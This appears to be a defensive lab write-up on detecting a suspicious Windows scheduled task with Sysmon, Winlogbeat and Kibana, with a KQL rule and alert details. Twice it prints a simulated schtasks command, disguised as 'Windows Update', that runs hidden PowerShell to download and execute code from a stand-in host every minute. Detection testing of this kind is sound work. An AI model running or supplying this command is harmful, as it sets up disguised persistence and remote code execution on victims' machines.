# 🕒 Creation of Suspicious Scheduled Task

## 📌 Objective  
Detect the creation of suspicious scheduled tasks on a Windows system using **Sysmon**, **Winlogbeat**, **Elasticsearch**, and **Kibana**.

---

## 🧪 What Was Done

### 🧰 Simulated Suspicious Scheduled Task Creation:
Created a scheduled task named **"Windows Update"** that runs a PowerShell command:

```cmd
    schtasks /create /tn "Windows Update" /tr "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious-url')" /sc minute /mo 1
```
# ⚙️ Configuration and Detection of Suspicious Scheduled Task

## ⚙️ Configured Sysmon
Ensured Sysmon was set to log **process creation events** (`Event ID 1`).

## 📤 Configured Winlogbeat
Forwarded **Sysmon logs** and **Windows Security logs** to **Elasticsearch**.

---

## 👁️ What Was Observed in the Logs

✅ **Sysmon Logs Captured**:

- **Event ID 1** – Process creation for `schtasks.exe` and `powershell.exe`.  
- **Event ID 4698** – Scheduled task creation event.

### 📝 Suspicious Scheduled Task - Summary

- 📅 **Timestamp**: `2025-05-24T09:47:45.606Z`
- 🧍 **User**: `VITICM-SOC\ranga`
- 💻 **Hostname**: `viticm-soc`
- 🛠️ **Process Created**: `schtasks.exe`
- 🔢 **Process ID**: `7680`
- 🧬 **Process GUID**: `{7e25c1a1-95c1-6831-f203-000000002600}`
- 📁 **Executable Path**: `C:\Windows\System32\schtasks.exe`
- 📜 **Command Line**:
  ```powershell
  schtasks /create /tn "Windows Update" /tr "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious-url')" /sc minute /mo 1

```
```
# 🧠 How SIEM Flagged the Event
# KQL String
event.code : "1"  AND process.name: "schtasks.exe"

---

## 🔔 Alert Details

- **Rule Name**: Creation of Suspicious Scheduled Task  
- **Event IDs**: 1 (Sysmon), 4698 (Windows Security)  
- **Description**: A new scheduled task was created, which may indicate suspicious activity.

---

## 📊 Data Source Mapping

| 🔍 Log Source       | 📂 Event Type           | 🆔 Event ID | 📄 Description                          |
|---------------------|-------------------------|-------------|------------------------------------------|
| Sysmon              | Process Creation         | 1           | Logs the creation of new processes.      |
| Windows Security    | Scheduled Task Creation | 4698        | Logs the creation of scheduled tasks.    |
| Winlogbeat          | Log Forwarding           | -           | Forwards all events to Elasticsearch.    |

---

## 📩 Sample Alert

![Screenshot 2025-05-24 203849](https://github.com/user-attachments/assets/fa96a21a-fe65-4d40-944e-e2a49f817db9)



---

## 🛡️ Analyst Action on Alert

- ✅ Reviewed the alert in **Kibana**  
- ✅ Investigated the scheduled task details and **command-line arguments**  
- ✅ Checked the **associated process and user context** for signs of malicious behavior

---

## ⚠️ Possible False Positives

| 🧩 Scenario         | 📌 Description                                         |
|---------------------|--------------------------------------------------------|
| Legitimate Updates  | Tasks created by admins for system updates.           |
| IT Automation       | Tasks made by automation tools for maintenance.       |
| User Activity       | Users creating tasks for personal or work needs.      |

---

## 🛠️ Recommendations

- ✅ **Whitelist Trusted Tasks**  
  Identify and whitelist known tasks created by trusted tools.

- 🧠 **Contextual Analysis**  
  Analyze command-line arguments and related processes to verify intent.

- 🔁 **Regular Rule Tuning**  
  Continuously refine detection rules to minimize false positives.
  

---

## 🧪 Detection Status

✅ **Successfully Triggered**

- Sysmon logged task creation via **Event ID 1**  
- Windows Security logged the event with **Event ID 4698**  

